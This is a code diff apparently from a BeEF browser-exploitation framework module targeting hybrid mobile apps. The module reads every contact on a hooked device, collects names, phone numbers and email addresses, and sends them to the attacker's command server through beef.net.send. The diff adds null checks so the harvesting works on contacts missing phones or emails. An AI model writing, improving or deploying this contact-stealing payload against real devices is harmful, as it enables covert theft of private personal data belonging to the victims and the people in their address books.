@@ -14,13 +14,17 @@ beef.execute(function() {
          for (var i=0; i<contacts.length; i++) {
             result = contacts[i].displayName;
             
-            for (var j=0; j<contacts[i].phoneNumbers.length; j++) {
-                result = result + ' #:' + contacts[i].phoneNumbers[j].value;
-            }
+	    if (contacts[i].phoneNumbers != null) {
+              for (var j=0; j<contacts[i].phoneNumbers.length; j++) {
+                  result = result + ' #:' + contacts[i].phoneNumbers[j].value;
+              }
+	    }
 
-            for (var j=0; j<contacts[i].emails.length; j++) {
-                result = result + ' @:' + contacts[i].emails[j].value;
-            }
+	    if (contacts[i].emails != null) {
+ 	           for (var j=0; j<contacts[i].emails.length; j++) {
+        	        result = result + ' @:' + contacts[i].emails[j].value;
+           	 }
+	    }
 
             beef.net.send("<%= @command_url %>", <%= @command_id %>, 'result='+result );    
 
